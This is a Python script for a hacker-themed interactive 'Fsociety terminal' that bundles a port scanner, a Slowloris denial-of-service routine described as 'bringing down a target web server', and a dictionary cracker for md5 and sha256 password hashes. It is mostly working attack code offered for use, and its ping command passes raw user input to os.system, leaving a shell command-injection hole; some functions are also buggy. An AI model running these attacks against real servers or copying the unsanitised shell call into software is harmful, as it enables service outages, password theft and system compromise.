import os
import socket
import random
import time
import hashlib

def portscan(target, min, max):
    try:
        for port in range(minPort, maxPort):  
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((target, port))
            if result == 0:
                print("   Port {}: 	 \033[0;32;40mOpen\033[0;37;40m".format(port))
            else:
                print("   Port {}: 	 \033[0;31;40mClosed\033[0;37;40m".format(port))
            sock.close()

    except socket.gaierror:
        print('Hostname could not be resolved')

    except socket.error:
        print("Couldn't connect to server")

def slowloris(target, connections):
    list_of_sockets = []

    regular_headers = [
        "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Accept-language: en-US,en,q=0.5"
    ]

    ip = target
    socket_count = connections
    print("Attacking {} with {} sockets.".format(ip, socket_count))

    print("Creating sockets...")
    for _ in range(socket_count):
        try:
            print("Creating socket {}".format(_ + 1))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, 80))
        except socket.error:
            break
        list_of_sockets.append(s)

    print("Setting up the sockets...")
    for s in list_of_sockets:
        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
        for header in regular_headers:
            s.send(bytes("{}\r\n".format(header).encode("utf-8")))

    while True:
        print("Sending keep-alive headers...")
        for s in list_of_sockets:
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except socket.error:
                list_of_sockets.remove(s)
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((ip, 80))
                    for s in list_of_sockets:
                        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
                        for header in regular_headers:
                            s.send(bytes("{}\r\n".format(header).encode("utf-8")))
                except socket.error:
                    continue
        time.sleep(15)

def dehash(algorithm, code, passList):
    passwords = []
    count = 1

    paswds = open(passList, "r")
    paswd = paswds.readlines()

    if algorithm == "sha256":
        for i in paswd:
            j = i.rstrip("\n")
            phash = hashlib.sha256(j.encode()).hexdigest()
            passwords.append(phash)
    elif algorithm == "md5":
        for i in paswd:
            j = i.rstrip("\n")
            phash = hashlib.md5(j.encode()).hexdigest()
            passwords.append(phash)
    else:
        print("Hash algorithm {} is not supported yet!".format(algorithm))
        print("""
        Supported algorithms: sha256
                              md5
        """)

    for i in range(len(passwords)):
        if passwords[i] == code:
            print("[\033[0;32;40m+\033[0;37;40m] Found password! {}:{}".format(code, paswd[i]))
            break
        else:
            print("[\033[0;31;40m-\033[0;37;40m] Attempt: {} | {}:{}".format(count, code, paswd[i]))
            count += 1


os.system("clear")

#print("--------------------------------------------")
#print("")
#print("      - Welcome to \033[0;31;40mF\033[0;37;40msociety terminal -      ")
#print("")
#print("--------------------------------------------")
#print("")
print("""
    \033[0;31;40m______ \033[0;37;40m _____                       _                _ 
    \033[0;31;40m|  ___|\033[0;37;40m|_   _|                     (_)              | |
    \033[0;31;40m| |_   \033[0;37;40m  | |  ___  _ __  _ __ ___   _  _ __    __ _ | |
    \033[0;31;40m|  _|  \033[0;37;40m  | | / _ \| '__|| '_ ` _ \ | || '_ \  / _` || |
    \033[0;31;40m| |    \033[0;37;40m  | ||  __/| |   | | | | | || || | | || (_| || |
    \033[0;31;40m\_|    \033[0;37;40m  \_/ \___||_|   |_| |_| |_||_||_| |_| \__,_||_|
                                                       \033[0;36;40mv1.0\033[0;37;40m
""")
command = "a"

while(command != "quit"):
    command = input("\033[0;36;40mF$> \033[0;37;40m")

    if(command == "help"):
        print("""
            help          displaying commands.
            \033[0;36;40m---NETWORK--------------------------------------\033[0;37;40m
            ping          pinging target.
            portscan      scanning target for open ports.
            \033[0;36;40m---DENIAL OF SERVICE----------------------------\033[0;37;40m
            slowloris     bringing down a target web server.
            \033[0;36;40m---BRUTEFORCE----------------------------\033[0;37;40m
            dehash        bruteforcing hashes""")

    if("ping" in command):
        if(" " in command):
            parametar = command.split()

            target = parametar[1]

            response = os.system("ping -c 1 " + target)

            print(response)
        else:
            print("""
            Usage: ping <target host/IP>
            Example: ping www.example.com
            """)

    if("portscan" in command):
        if(" " in command):
            parametar = command.split()

            target = parametar[1]
            minPort = int(parametar[2])
            maxPort = int(parametar[3])

            portscan(target, minPort, maxPort)

        else:
            print("""
            Usage: portscan <target host/IP> <min PORT> <max PORT>
            Example: portscan 192.168.1.1 1 100
            """)

    if("slowloris" in command):
        if(" " in command):
            parametar = command.split()

            target = parametar[1]
            count = int(parametar[2])

            slowloris(target, count)

        else:
            print("""
            Usage: slowloris <target host/IP> <threads>
            Example: slowloris www.example.com 200
            """)

    if("dehash" in command):
        if(" " in command):
            parametar = command.split()

            algorithm = parametar[1]
            code = parametar[2]
            passList = parametar[3]

            dehash(algorithm, code, passList)

        else:
            print("""
            Usage: dehash <hash algorithm> <hash> <path to password list>
            Example: dehash sha256 189f40034be7a199f1fa9891668ee3ab6049f82d38c68be70f596eab2e1857b7 paswd.txt
            """)
